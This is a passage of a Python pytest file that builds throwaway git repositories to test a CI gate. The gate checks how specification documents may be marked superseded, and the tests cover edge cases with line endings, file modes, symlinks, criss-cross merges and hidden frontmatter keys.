    relabel of it carries no retirement and keeps main's verdict (step 6, row C1d's shape): the null-pointer relabel
    is admitted, and the relabel of a P naming a superseded Q is refused by round eight alone, with no step 5 line.
    (At 8814e1c1 the old merge-main text fired here.)"""
    on_base(repo, {P_SPEC: spec(status="superseded")})
    r = pr(repo, RETIRE_BRANCH, {P_SPEC: spec(status="superseded").replace("\n", "\r\n")})
    assert r.returncode == 0 and "already superseded on the current base" not in r.stdout, r.stdout
    on_base(repo, {SPEC: spec(status="superseded"), P_SPEC: spec(status="superseded", supersedes=SPEC)})
    r = pr(repo, RETIRE_BRANCH, {P_SPEC: spec(status="superseded", supersedes=SPEC).replace("\n", "\r\n")})
    assert r.returncode == 1 and f"{P_SPEC}: supersedes {SPEC}, {ROUND_EIGHT}" in r.stdout, r.stdout
    assert "already superseded on the current base" not in r.stdout, r.stdout


def test_cr_only_line_endings_take_the_flip_and_refuse_extra_bytes(repo):
    """IMPL-CICD1 R1 F2: the byte-level status strip treats a lone CR as a line break, as `Tree.read` does, so a
    CR-only spec is retired by the same status-only flip (positive control; at 8814e1c1 round eight refused it), while
    the enumerated byte changes in such a file still leave the exemption unreached with today's messages (negative
    controls): a done_when word is refused in place and by round eight, a relabel to LF beside the flip by round
    eight alone, since the folded text is equal. No spec in the repository carries a CR byte; this measures the
    anchor, not a live case."""
    cr = lambda s: s.replace("\n", "\r")
    on_base(repo, {SPEC: cr(spec(status="superseded")), P_SPEC: cr(spec(supersedes=SPEC))})
    r = pr(repo, RETIRE_BRANCH, {N_SPEC: spec(supersedes=P_SPEC), P_SPEC: cr(flipped_p())})
    assert r.returncode == 0 and "spec gate ok" in r.stdout, r.stdout
    r = pr(repo, RETIRE_BRANCH, {N_SPEC: spec(supersedes=P_SPEC), P_SPEC: cr(flipped_p(done_when=["something easier", DONE[1]]))})
    assert r.returncode == 1 and f"{P_SPEC}: supersedes {SPEC}, {ROUND_EIGHT}" in r.stdout, r.stdout
    assert f"{P_SPEC}: an approved spec does not change in place" in r.stdout, r.stdout
    r = pr(repo, RETIRE_BRANCH, {N_SPEC: spec(supersedes=P_SPEC), P_SPEC: flipped_p()})
    assert r.returncode == 1 and f"{P_SPEC}: supersedes {SPEC}, {ROUND_EIGHT}" in r.stdout, r.stdout
    assert "does not change in place" not in r.stdout, r.stdout


def test_nul_byte_in_an_inherited_pointer_is_refused_not_a_traceback(repo):
    """IMPL-CICD1 R1 F3: an unchanged base spec whose pointer carries a NUL byte names no git path; the chain walk
    refuses it as not written canonically, with the ordinary verdict and no traceback (at 8814e1c1 `git show`
    raised an uncaught ValueError: exit 1, empty stdout). Main d806bfd1 admits the change, never reading that edge."""
    nul = "docs/superpowers/specs/\x00x.md"
    on_base(repo, {SPEC: spec(status="superseded"), P_SPEC: spec(supersedes=nul)})
    r = pr(repo, RETIRE_BRANCH, {N_SPEC: spec(supersedes=P_SPEC)})
    assert r.returncode == 1 and "SPEC GATE FAILED" in r.stdout, (r.stdout, r.stderr)
    assert f"{N_SPEC}: supersedes chain reaches {nul!r}, which is not written as docs/superpowers/specs/<file>.md" in r.stdout, r.stdout
    assert "Traceback" not in r.stderr, r.stderr


def test_mode_only_change_of_a_superseded_spec_is_not_called_redundant(repo):
    """IMPL-CICD2 R1 F1, under the replacement spec's step 5: a mode-only change (100644 to 100755, bytes identical)
    to a P already superseded at the merge base carries no retirement and keeps main's verdict (step 6): a P naming
    a superseded Q is refused by round eight alone and a null-pointer P is admitted, with no step 5 line."""
    chmod = lambda root: (root / P_SPEC).chmod(0o755)
    on_base(repo, {SPEC: spec(status="superseded"), P_SPEC: spec(status="superseded", supersedes=SPEC), N_SPEC: spec(supersedes=P_SPEC)})
    r = pr(repo, RETIRE_BRANCH, {}, then=chmod)
    assert r.returncode == 1 and f"{P_SPEC}: supersedes {SPEC}, {ROUND_EIGHT}" in r.stdout, r.stdout
    assert "already superseded on the current base" not in r.stdout, r.stdout
    on_base(repo, {SPEC: spec(status="superseded"), P_SPEC: spec(status="superseded"), N_SPEC: spec(supersedes=P_SPEC)})
    r = pr(repo, RETIRE_BRANCH, {}, then=chmod)
    assert r.returncode == 0 and "spec gate ok" in r.stdout, r.stdout


def mode_divergent_pr(repo: Path, branch_files: dict[str, str | None], branch_modes: dict[str, int],
                      main_files: dict[str, str | None], main_modes: dict[str, int]) -> subprocess.CompletedProcess:
    """`divergent_pr` with modes: the branch, cut from `base`, writes `branch_files` and sets `branch_modes`; main then
    writes `main_files` and sets `main_modes`; the gate judges the branch against main's tip, the merge base kept."""
    _git(repo, "reset", "-q", "--hard")
    _git(repo, "clean", "-qfd")
    _git(repo, "checkout", "-q", "-B", RETIRE_BRANCH, "base")
    for path, text in branch_files.items():
        write(repo, path, text)
    for path, mode in branch_modes.items():
        (repo / path).chmod(mode)
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", f"change on {RETIRE_BRANCH}")
    head = _git(repo, "rev-parse", "HEAD")
    on_base(repo, main_files, then=lambda root: [(root / path).chmod(mode) for path, mode in main_modes.items()])
    return gate(repo, "--pr", _git(repo, "rev-parse", "base"), head, PR_HEAD_REF=RETIRE_BRANCH)


def test_merge_main_advice_follows_the_mode_a_merge_of_main_keeps(repo):
    """IMPL-CICD3 R1 F1 rows. Name kept from the 2026-10-31 contract because the gate's suite only grows (a test on the branch is not dropped); the body asserts the 2026-11-01 replacement spec's step 5. Main retired P after the fork and the branch flipped P to the same text; whatever
    the modes on the merge base, the branch and main, the change repeats main's retirement and step 5 refuses it with
    its one message, which predicts no merge; when the branch's text differs it is not a redundant retirement and
    no step 5 line appears. Round eight still refuses N's pointer in every row."""
    refused = f"{N_SPEC}: supersedes {P_SPEC}, {ROUND_EIGHT}"
    n2 = "docs/superpowers/specs/2026-09-06-model-decisions-v4.md"
    main = {n2: spec(supersedes=P_SPEC), P_SPEC: flipped_p()}
    for name, merge_base_mode, branch_p, branch_mode, main_mode in (
            ("main set +x, branch left the mode", 0o644, flipped_p(), 0o644, 0o755),
            ("main cleared +x, branch left the mode", 0o755, flipped_p(), 0o755, 0o644),
            ("both set +x", 0o644, flipped_p(), 0o755, 0o755),
            ("main kept the mode, branch set +x", 0o644, flipped_p(), 0o755, 0o644),
            ("main kept the mode, branch cleared +x", 0o755, flipped_p(), 0o644, 0o755),
            ("main set +x, branch bytes differ", 0o644, flipped_p() + "\nA branch note.\n", 0o644, 0o755)):
        on_base(repo, {SPEC: spec(status="superseded"), P_SPEC: spec(supersedes=SPEC)},
                then=lambda root: (root / P_SPEC).chmod(merge_base_mode))   # P's mode on the merge base, per row
        r = mode_divergent_pr(repo, {N_SPEC: spec(supersedes=P_SPEC), P_SPEC: branch_p}, {P_SPEC: branch_mode},
                              main, {P_SPEC: main_mode})
        assert r.returncode == 1 and refused in r.stdout, (name, r.stdout)
        assert (f"{P_SPEC}: {REDUNDANT}" in r.stdout) is (branch_p == flipped_p()), (name, r.stdout)
        assert "merge main so the file leaves" not in r.stdout and "repeats that retirement" not in r.stdout, (name, r.stdout)


def test_merge_main_advice_is_withheld_outside_regular_files_and_one_merge_base(repo):
    """IMPL-CICD4 R1 F1 and F2 shapes. Name kept from the 2026-10-31 contract because the gate's suite only grows (a test on the branch is not dropped); the body asserts the 2026-11-01 replacement spec's step 5. (1) Main turned P into a symlink whose target text is the flipped P;
    (2) a criss-cross history with two merge bases holding P at different modes. Neither depends on a merge
    prediction now: step 5 refuses both with its one message, beside round eight on N's pointer."""
    refused = f"{N_SPEC}: supersedes {P_SPEC}, {ROUND_EIGHT}"
    n2 = "docs/superpowers/specs/2026-09-06-model-decisions-v4.md"
    retirement_lineage(repo)
    _git(repo, "checkout", "-q", "-B", RETIRE_BRANCH, "base")
    write(repo, N_SPEC, spec(supersedes=P_SPEC))
    write(repo, P_SPEC, flipped_p())
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", "flip P, regular file")
    head = _git(repo, "rev-parse", "HEAD")
    _git(repo, "checkout", "-q", "main")
    write(repo, n2, spec(supersedes=P_SPEC))
    (repo / P_SPEC).unlink()
    os.symlink(flipped_p(), repo / P_SPEC)
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", "main: P as a symlink")
    assert _git(repo, "ls-tree", "HEAD", "--", P_SPEC).split()[0] == "120000"
    r = gate(repo, "--pr", _git(repo, "rev-parse", "main"), head, PR_HEAD_REF=RETIRE_BRANCH)
    assert r.returncode == 1 and refused in r.stdout and f"{P_SPEC}: {REDUNDANT}" in r.stdout, r.stdout
    assert "merge main so the file leaves" not in r.stdout and "repeats that retirement" not in r.stdout, r.stdout
    # (2) criss-cross: P at 755 on the fork point; the branch side sets 644 (X), main's side leaves 755 (Y); each
    # merges the other's commit, so X and Y are both merge bases. The branch flips P at 755, main at 644.
    _git(repo, "reset", "-q", "--hard")
    _git(repo, "checkout", "-q", "-B", "main", "base")
    (repo / P_SPEC).chmod(0o755)
    _git(repo, "commit", "-q", "-am", "P at 755")
    fork = _git(repo, "rev-parse", "HEAD")
    _git(repo, "checkout", "-q", "-B", RETIRE_BRANCH, fork)
    write(repo, "docs/x.md", "x\n")
    (repo / P_SPEC).chmod(0o644)
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", "X")
    x = _git(repo, "rev-parse", "HEAD")
    _git(repo, "checkout", "-q", "main")
    write(repo, "docs/y.md", "y\n")
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", "Y")
    y = _git(repo, "rev-parse", "HEAD")
    _git(repo, "merge", "-q", "--no-edit", x)
    _git(repo, "checkout", "-q", RETIRE_BRANCH)
    _git(repo, "merge", "-q", "--no-edit", y)
    write(repo, N_SPEC, spec(supersedes=P_SPEC))
    write(repo, P_SPEC, flipped_p())
    (repo / P_SPEC).chmod(0o755)
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", "flip P at 755")
    head = _git(repo, "rev-parse", "HEAD")
    _git(repo, "checkout", "-q", "main")
    write(repo, n2, spec(supersedes=P_SPEC))
    write(repo, P_SPEC, flipped_p())
    (repo / P_SPEC).chmod(0o644)
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", "main flips P at 644")
    main_tip = _git(repo, "rev-parse", "HEAD")
    assert len(_git(repo, "merge-base", "--all", main_tip, head).split()) == 2
    assert _git(repo, "ls-tree", _git(repo, "merge-base", main_tip, head), "--", P_SPEC).split()[0] == "100755"
    r = gate(repo, "--pr", main_tip, head, PR_HEAD_REF=RETIRE_BRANCH)
    assert r.returncode == 1 and refused in r.stdout and f"{P_SPEC}: {REDUNDANT}" in r.stdout, r.stdout
    assert "merge main so the file leaves" not in r.stdout and "repeats that retirement" not in r.stdout, r.stdout


def crisscross_pr(repo: Path, x_mode: int, y_mode: int, branch_files: dict[str, str], head_mode: int,
                  main_files: dict[str, str], main_mode: int) -> subprocess.CompletedProcess:
    """From `base`: a fork commit sets P to `y_mode`; the branch side X writes docs/x.md and sets P to `x_mode`, main's
    side Y writes docs/y.md (both named after the fork, so every call commits); each merges the other, so X and Y are both merge bases. The branch then writes
    `branch_files` with P at `head_mode`, main writes `main_files` with P at `main_mode`; the gate judges the branch."""
    _git(repo, "reset", "-q", "--hard")
    _git(repo, "checkout", "-q", "-B", "main", "base")
    (repo / P_SPEC).chmod(y_mode)
    _git(repo, "commit", "-q", "--allow-empty", "-am", "fork")
    fork = _git(repo, "rev-parse", "HEAD")
    _git(repo, "checkout", "-q", "-B", RETIRE_BRANCH, fork)
    write(repo, "docs/x.md", f"x {fork}\n")
    (repo / P_SPEC).chmod(x_mode)
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", "X")
    x = _git(repo, "rev-parse", "HEAD")
    _git(repo, "checkout", "-q", "main")
    write(repo, "docs/y.md", f"y {fork}\n")
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", "Y")
    y = _git(repo, "rev-parse", "HEAD")
    _git(repo, "merge", "-q", "--no-edit", x)
    _git(repo, "checkout", "-q", RETIRE_BRANCH)
    _git(repo, "merge", "-q", "--no-edit", y)
    for path, text in branch_files.items():
        write(repo, path, text)
    (repo / P_SPEC).chmod(head_mode)
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", "branch change")
    head = _git(repo, "rev-parse", "HEAD")
    _git(repo, "checkout", "-q", "main")
    for path, text in main_files.items():
        write(repo, path, text)
    (repo / P_SPEC).chmod(main_mode)
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", "main change")
    main_tip = _git(repo, "rev-parse", "HEAD")
    assert len(_git(repo, "merge-base", "--all", main_tip, head).split()) == 2
    return gate(repo, "--pr", main_tip, head, PR_HEAD_REF=RETIRE_BRANCH)


def test_redundant_flip_is_refused_whatever_the_mode_or_history(repo):
    """IMPL-CICD5 R2 F1 rows, under the replacement spec's step 5. A null-pointer flip main already made after the fork
    (no round eight to refuse it otherwise) is refused in every shape: linear with any mode combination, criss-cross
    histories and a symlink on main, with the one step 5 message. Main admits every such row (rc 0). Outside the
    retirement (P already superseded at the fork, only its mode changed) the result is main's (step 6, rc 0), and an
    added P identical to main's superseded copy is refused by step 5."""
    flip = spec(status="superseded")
    main = {"docs/superpowers/specs/2026-09-06-model-decisions-v4.md": spec(supersedes=P_SPEC), P_SPEC: flip}
    redundant = f"{P_SPEC}: {REDUNDANT}"
    for name, merge_base_mode, head_mode, main_mode, text in (
            ("linear, no mode change", 0o644, 0o644, 0o644, redundant),
            ("linear, main set +x", 0o644, 0o644, 0o755, redundant),
            ("linear, both set +x", 0o644, 0o755, 0o755, redundant),
            ("linear, branch-only +x", 0o644, 0o755, 0o644, redundant)):
        on_base(repo, {P_SPEC: spec()}, then=lambda root: (root / P_SPEC).chmod(merge_base_mode))
        r = mode_divergent_pr(repo, {P_SPEC: flip}, {P_SPEC: head_mode}, main, {P_SPEC: main_mode})
        assert r.returncode == 1 and text in r.stdout and ROUND_EIGHT not in r.stdout, (name, r.stdout)
        assert "merge main so the file leaves" not in r.stdout and "repeats that retirement" not in r.stdout, (name, r.stdout)
    for name, x_mode, y_mode, head_mode, text in (
            ("criss-cross, merge bases differ, head keeps 755", 0o644, 0o755, 0o755, redundant),
            ("criss-cross, merge bases both 755 (merge is a no-op)", 0o755, 0o755, 0o755, redundant),
            ("criss-cross, head mode equals main's", 0o644, 0o755, 0o644, redundant)):
        on_base(repo, {P_SPEC: spec()})
        r = crisscross_pr(repo, x_mode, y_mode, {P_SPEC: flip}, head_mode, main, 0o644)
        assert r.returncode == 1 and text in r.stdout, (name, r.stdout)
        assert "merge main so the file leaves" not in r.stdout and "repeats that retirement" not in r.stdout, (name, r.stdout)
    # main turns P into a symlink whose target text is the flipped P
    on_base(repo, {P_SPEC: spec()})
    _git(repo, "checkout", "-q", "-B", RETIRE_BRANCH, "base")
    write(repo, P_SPEC, flip)
    _git(repo, "commit", "-q", "-am", "flip P")
    head = _git(repo, "rev-parse", "HEAD")
    _git(repo, "checkout", "-q", "main")
    (repo / P_SPEC).unlink()
    os.symlink(flip, repo / P_SPEC)
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", "main: P as a symlink")
    r = gate(repo, "--pr", _git(repo, "rev-parse", "main"), head, PR_HEAD_REF=RETIRE_BRANCH)
    assert r.returncode == 1 and redundant in r.stdout, r.stdout
    _git(repo, "reset", "-q", "--hard", "HEAD~1")   # main back to a regular P before the next fixture writes it
    # outside the flip: P superseded at the fork, the branch changes only its mode (main's result, rc 0)
    on_base(repo, {SPEC: spec(status="superseded"), P_SPEC: flip, N_SPEC: spec(supersedes=P_SPEC)})
    r = pr(repo, RETIRE_BRANCH, {}, then=lambda root: (root / P_SPEC).chmod(0o755))
    assert r.returncode == 0 and "spec gate ok" in r.stdout, r.stdout
    # absent at the fork, both sides add the identical superseded P: refused by step 5 alone
    _git(repo, "reset", "-q", "--hard")
    _git(repo, "checkout", "-q", "main")
    _git(repo, "rm", "-q", P_SPEC, N_SPEC)
    _git(repo, "commit", "-q", "-m", "drop P and N")
    _git(repo, "tag", "-f", "base")
    r = divergent_pr(repo, RETIRE_BRANCH, {P_SPEC: flip}, {P_SPEC: flip})
    assert r.returncode == 1 and refusals(r) == [redundant], r.stdout


def test_flip_changes_only_the_status_entry_and_hides_no_key(repo):
    """IMPL-CICD2 R1 F2 (and pass-1 R1 F4, R3 P2-2): the exemption admits a flip whose bytes outside the one physical
    line holding the frontmatter `status` entry are unchanged, in place, and whose entry line holds no second logical
    line. At 29314273 `status: superseded\x0cissues: [4242]` (`frontmatter` splits on form feed and U+2028, the strip
    lambdas blank the whole physical line) and a rewritten body line beginning `status:` rode the flip (rc 0; main
    refused both by round eight); so did a body `status:` line moved between blank lines, which a check on the
    status lines' values alone also admits, since it loses position. Each is refused here by round eight. A quoted,
    spaced or commented value on the entry is the parser's business and passes when only the entry changes. The
    in-place rule is untouched: at depth one (P with a null pointer) the hidden key is still admitted on this gate as
    on main (old-behaviour control, recorded, not changed by this exemption)."""
    n = {N_SPEC: spec(supersedes=P_SPEC)}
    refused = f"{P_SPEC}: supersedes {SPEC}, {ROUND_EIGHT}"
    p_base, p_head = spec(supersedes=SPEC), flipped_p()
    entry = lambda doc, old, new: doc.replace(old, new, 1)
    for base_line, head_line in (("status: approved", "status: superseded"),
                                 ("status: 'approved'", "status: 'superseded'"),
                                 ('status: "approved"', 'status: "superseded"'),
                                 ("status:  approved ", "status:  superseded "),
                                 ("status: approved", "status: superseded # retired by v3")):
        on_base(repo, {SPEC: spec(status="superseded"), P_SPEC: entry(p_base, "status: approved", base_line)})
        r = pr(repo, RETIRE_BRANCH, {**n, P_SPEC: entry(p_head, "status: superseded", head_line)})
        assert r.returncode == 0 and "spec gate ok" in r.stdout, (base_line, head_line, r.stdout)
    # the last base above is the plain lineage (Q superseded, P approved naming Q)
    for head_line, r in each_pr(repo, lambda head_line: pr_case(RETIRE_BRANCH, {**n, P_SPEC: entry(p_head, "status: superseded", head_line)}), ("status: superseded\x0cissues: [4242]", "status: superseded\u2028issues: [4242]",
                      "status: superseded\x0c")):
        assert r.returncode == 1 and refused in r.stdout, (head_line, r.stdout)
        assert "does not change in place" not in r.stdout, (head_line, r.stdout)
    body = lambda doc, tail: doc.rstrip("\n") + "\n" + tail
    for base_tail, head_tail, admitted in (("status: body note\n", "status: body note\n", True),
                                           ("\nA\n\nstatus: body note\n\nB\n", "\nA\n\n\nstatus: body note\nB\n", False),
                                           ("status: body note\n", "status: SOMETHING ELSE\n", False)):   # each base differs from the last
        on_base(repo, {SPEC: spec(status="superseded"), P_SPEC: body(p_base, base_tail)})
        r = pr(repo, RETIRE_BRANCH, {**n, P_SPEC: body(p_head, head_tail)})
        if admitted:
            assert r.returncode == 0 and "spec gate ok" in r.stdout, (head_tail, r.stdout)
        else:
            assert r.returncode == 1 and refused in r.stdout, (head_tail, r.stdout)
    on_base(repo, {SPEC: spec(status="superseded"), P_SPEC: spec()})
    r = pr(repo, RETIRE_BRANCH, {**n, P_SPEC: spec(status="superseded").replace("status: superseded", "status: superseded\x0cissues: [4242]")})
    assert r.returncode == 0 and "spec gate ok" in r.stdout, r.stdout


# Spec 2026-11-01-feat-cicd-001-truthful-redundant-retirement, done_when item 5, step 5 domain rows C1a to C1d, and the
# #1665 controls (RQ-2, RQ-3). P0 is P's path written approved with `supersedes: null` and retired by N, so no
# round-eight refusal applies. Fixture placement (#1665 RQ-3): N exists only on main, added there with main's flip of
# P0; the branch never carries N (with N on the branch, round eight refuses N's new pointer to a spec superseded at
# the current base, and "no other refusal" would not hold). Each row runs in a fresh fixture repository.

N0_MAIN = {N_SPEC: spec(supersedes=P_SPEC)}


def p0(**over) -> str:
    return spec(supersedes="null", **over)


def refusals(r: subprocess.CompletedProcess) -> list[str]:
    """The refusal lines the gate printed, in order."""
    return [line[3:] for line in r.stdout.splitlines() if line.startswith(" - ")]


def fresh(tmp_path: Path, name: str) -> Path:
    (tmp_path / name).mkdir()
    return make_repo(tmp_path / name)


def test_redundant_retirement_line_ending_copy_refused(tmp_path):
    """C1a: P0 approved at the fork; main flips it with LF and adds N; the branch flips it with CRLF, and with CR-only.
    The text the gate reads is equal, so step 5 refuses with its message and nothing else (main admits each row; at
    4ef70d89, which compared bytes, each row passed too: IMPL-CICD6 R2 F1). A real merge of main conflicts here, which
    is why the message promises no merge result."""
    for name, convert in (("crlf", lambda t: t.replace("\n", "\r\n")), ("cr-only", lambda t: t.replace("\n", "\r"))):
        repo = fresh(tmp_path, name)
        on_base(repo, {P_SPEC: p0()})
        r = divergent_pr(repo, RETIRE_BRANCH, {P_SPEC: convert(p0(status="superseded"))},
                         {**N0_MAIN, P_SPEC: p0(status="superseded")})
        assert r.returncode == 1 and refusals(r) == [f"{P_SPEC}: {REDUNDANT}"], (name, r.stdout)


def test_redundant_retirement_mode_only_copy_refused(tmp_path):
    """C1b: P0 approved at the fork at 100644; main flips it and adds N; the branch makes main's byte-identical flip
    with file mode 100755 (and, reversed, main at 100755 and the branch at 100644). Refused by step 5 alone; main admits
    both rows. A merge of main keeps the branch's mode, so the file stays in the change."""
    for name, merge_base_mode, head_mode, main_mode in (("branch +x", 0o644, 0o755, 0o644),
                                                        ("main +x, branch kept 644", 0o755, 0o644, 0o755)):
        repo = fresh(tmp_path, name.replace(" ", "-").replace(",", ""))
        on_base(repo, {P_SPEC: p0()}, then=lambda root: (root / P_SPEC).chmod(merge_base_mode))
        r = mode_divergent_pr(repo, {P_SPEC: p0(status="superseded")}, {P_SPEC: head_mode},
                              {**N0_MAIN, P_SPEC: p0(status="superseded")}, {P_SPEC: main_mode})
        assert r.returncode == 1 and refusals(r) == [f"{P_SPEC}: {REDUNDANT}"], (name, r.stdout)


NEAR_COPY = "docs/notes/model-decisions-copy.md"


def test_redundant_retirement_absent_at_fork_refused(tmp_path):
    """C1c: P0 absent at the fork. (1) Main and the branch each add the identical superseded P0 (main adds N too).
    (2) The same with the branch copy at 100755. (3) A rename of a near-copy onto the path main adds. Near-copy
    provenance (#1665 RQ-3): NEAR_COPY, a note outside docs/superpowers/specs/ (so its deletion is no spec deletion),
    is on the base at the fork holding P0's superseded text plus one note line; the branch `git mv`s it onto P0's path
    and writes main's superseded bytes; main adds P0 with those bytes and edits the note (a real merge reports a
    rename collision: IMPL-CICD6 R1 F1). Each row is refused by step 5 alone; main admits every row."""
    flip = p0(status="superseded")
    repo = fresh(tmp_path, "both-add")
    r = divergent_pr(repo, RETIRE_BRANCH, {P_SPEC: flip}, {**N0_MAIN, P_SPEC: flip})
    assert r.returncode == 1 and refusals(r) == [f"{P_SPEC}: {REDUNDANT}"], r.stdout
    repo = fresh(tmp_path, "both-add-755")
    r = mode_divergent_pr(repo, {P_SPEC: flip}, {P_SPEC: 0o755}, {**N0_MAIN, P_SPEC: flip}, {})
    assert r.returncode == 1 and refusals(r) == [f"{P_SPEC}: {REDUNDANT}"], r.stdout
    repo = fresh(tmp_path, "rename")
    on_base(repo, {NEAR_COPY: flip + "A note kept beside the copy.\n"})
    _git(repo, "checkout", "-q", "-B", RETIRE_BRANCH, "base")
    (repo / P_SPEC).parent.mkdir(parents=True, exist_ok=True)
    _git(repo, "mv", NEAR_COPY, P_SPEC)
    write(repo, P_SPEC, flip)
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", "move the copy onto P0")
    head = _git(repo, "rev-parse", "HEAD")
    assert "R" in _git(repo, "diff", "--name-status", "-M", "base", head).split()[0]
    on_base(repo, {**N0_MAIN, P_SPEC: flip, NEAR_COPY: flip + "A note main edited.\n"})
    r = gate(repo, "--pr", _git(repo, "rev-parse", "base"), head, PR_HEAD_REF=RETIRE_BRANCH)
    assert r.returncode == 1 and refusals(r) == [f"{P_SPEC}: {REDUNDANT}"], r.stdout


def test_edit_of_spec_superseded_at_fork_keeps_main_verdict(tmp_path):
    """C1d: the merge base already holds P0 superseded (N on the base names it), so the change carries no retirement
    and main's verdict stands (step 6): a CRLF relabel, a branch-only chmod, and the identical chmod on both sides are
    admitted on main and here, with no step 5 line. The CRLF relabel and identical-chmod rows are refused with the step
    5 message by a gate that drops the merge-base condition, so they discriminate it (the branch-only chmod row too).
    The same shapes on a P naming a superseded Q: test_crlf_relabel_of_a_superseded_spec_is_not_called_redundant and
    test_mode_only_change_of_a_superseded_spec_is_not_called_redundant."""
    flip = p0(status="superseded")
    for name, run in (
            ("crlf relabel", lambda repo: pr(repo, RETIRE_BRANCH, {P_SPEC: flip.replace("\n", "\r\n")})),
            ("branch-only chmod", lambda repo: pr(repo, RETIRE_BRANCH, {}, then=lambda root: (root / P_SPEC).chmod(0o755))),
            ("identical chmod on both sides",
             lambda repo: mode_divergent_pr(repo, {}, {P_SPEC: 0o755}, {"docs/notes/main.md": "main\n"}, {P_SPEC: 0o755}))):
        repo = fresh(tmp_path, name.replace(" ", "-"))
        on_base(repo, {**N0_MAIN, P_SPEC: flip})
        r = run(repo)
        assert r.returncode == 0 and "spec gate ok" in r.stdout and REDUNDANT not in r.stdout, (name, r.stdout)


def test_resave_of_an_approved_spec_is_not_called_redundant(tmp_path):
    """#1665 RQ-2: step 5 needs the base to hold the spec superseded. An ordinary approved P0, unchanged in text, staged
    or pushed with CRLF line endings or with mode 100755, is admitted with no new message in commit mode and in PR
    mode, as on main. A gate that drops the `base status == superseded` condition refuses all four rows with the step 5
    message (in commit mode `ch.before` is the base, approved, so only that condition keeps it out)."""
    crlf = {P_SPEC: p0().replace("\n", "\r\n")}
    chmod = lambda root: (root / P_SPEC).chmod(0o755)
    for name, files, then in (("crlf", crlf, None), ("chmod", {}, chmod)):
        repo = fresh(tmp_path, "commit-" + name)
        on_base(repo, {P_SPEC: p0()})
        _git(repo, "checkout", "-q", "-B", RETIRE_BRANCH, "base")
        for path, text in files.items():
            write(repo, path, text)
        if then is not None:
            then(repo)
        _git(repo, "add", "-A")
        assert _git(repo, "diff", "--cached", "--name-only") == P_SPEC
        r = gate(repo, "--commit")
        assert r.returncode == 0 and REDUNDANT not in r.stdout, (name, r.stdout)
        repo = fresh(tmp_path, "pr-" + name)
        on_base(repo, {P_SPEC: p0()})
        r = pr(repo, RETIRE_BRANCH, files, then=then)
        assert r.returncode == 0 and "spec gate ok" in r.stdout and REDUNDANT not in r.stdout, (name, r.stdout)


def test_redundant_retirement_of_a_spec_draft_or_legacy_at_fork_refused(tmp_path):
    """#1665 RQ-2, the merge base's "holds another status" branch: P0 is draft at the fork, or a legacy file with no
    frontmatter there; main retires it (adding N) and the branch writes the identical superseded P0. The change
    carries the retirement, so step 5 refuses with its message alone; main admits both rows. A gate that reads only
    "absent at the merge base" admits them."""
    flip = p0(status="superseded")
    for name, at_fork in (("draft", p0(status="draft")), ("legacy", "# Model decisions v2\n\nWritten before the gate.\n")):
        repo = fresh(tmp_path, name)
        on_base(repo, {P_SPEC: at_fork})
        r = divergent_pr(repo, RETIRE_BRANCH, {P_SPEC: flip}, {**N0_MAIN, P_SPEC: flip})
        assert r.returncode == 1 and refusals(r) == [f"{P_SPEC}: {REDUNDANT}"], (name, r.stdout)
